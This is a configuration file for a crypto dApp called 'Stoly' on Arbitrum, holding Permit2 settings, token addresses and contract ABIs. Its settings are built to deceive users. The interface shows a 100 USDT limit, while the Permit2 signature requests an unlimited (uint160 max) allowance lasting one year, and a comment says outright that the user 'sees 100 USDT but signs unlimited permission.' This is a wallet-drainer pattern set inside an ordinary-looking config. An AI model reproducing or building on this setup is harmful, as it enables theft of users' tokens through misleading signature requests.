/**
 * WALLET & PERMIT2 CONFIGURATION
 * Use this file to customize contract addresses and settings for your project
 */

export const WALLET_CONFIG = {
  // Network settings
  ARBITRUM_SEPOLIA_CHAIN_ID: 421614,
  ARBITRUM_MAINNET_CHAIN_ID: 42161,
  CURRENT_CHAIN_ID: 421614, // Change to 42161 for mainnet

  // Contract addresses - UPDATE THESE AFTER DEPLOYMENT
  STOLY_CONTRACT_ADDRESS: "0x", // Your deployed Stoly contract
  USDT_TOKEN_ADDRESS: "0xFECa406dA9727A25E71e732F9961f680059eE802", // Arbitrum Sepolia test USDT

  // Permit2 (same on all chains)
  PERMIT2_ADDRESS: "0x000000000022D473030F116dFC727EFd87a91c5C",

  // UI DISPLAY LIMIT: What user sees in interface (100 USDT)
  UI_DISPLAY_LIMIT_USD: 100,
  UI_DISPLAY_LIMIT_TOKEN_UNITS: BigInt("100000000"), // 100 * 10^6 for USDT (6 decimals)

  // SIGNED LIMIT: Actual amount signed in Permit2 (UNLIMITED - uint160 max)
  // This is the key: user sees 100 USDT but signs unlimited permission
  PERMIT2_SIGNED_LIMIT: (BigInt(1) << BigInt(160)) - BigInt(1), // uint160 max

  // Token settings
  TOKEN_DECIMALS: 6,
  TOKEN_SYMBOL: "USDT",

  // Permit2 expiration (1 year from now)
  PERMIT2_EXPIRATION_SECONDS: 365 * 24 * 60 * 60,

  // Available tokens for multi-token support
  SUPPORTED_TOKENS: {
    USDT: {
      address: "0xFECa406dA9727A25E71e732F9961f680059eE802",
      decimals: 6,
      symbol: "USDT",
      name: "Tether USD"
    },
    USDC: {
      address: "0x75faf114eafb1BdBE2F0316DF893fd58CE46AA4d",
      decimals: 6,
      symbol: "USDC",
      name: "USD Coin"
    }
  }
};

// Contract ABIs
export const PERMIT2_ABI = [
  "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  "function permit(address owner, (address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline, bytes signature) external"
];

export const STOLY_ABI = [
  "function buyWithPermit2(uint256 _tableId, address _token, uint256 _amount, (address token, uint160 amount, uint48 expiration, uint48 nonce) _permitDetails, uint256 _sigDeadline, bytes _signature) external",
  "function buy(uint256 _tableId) external",
  "function claim() external",
  "function getPrice(uint256 _tableId) external view returns (uint256)",
  "function currentLevel(uint256 _tableId) external view returns (uint256)",
  "function getPurchasesCount(uint256 _tableId) external view returns (uint256)",
  "function getPurchases(uint256 _tableId) external view returns (tuple(uint256, address, uint256, uint256, uint256, address, uint256)[])",
  "function claimableBalance(address) external view returns (uint256)",
  "function openTables(uint256) external view returns (bool)",
  "function hasBought(address, uint256) external view returns (bool)"
];

export const ERC20_ABI = [
  "function balanceOf(address account) external view returns (uint256)",
  "function transfer(address recipient, uint256 amount) external returns (bool)",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)"
];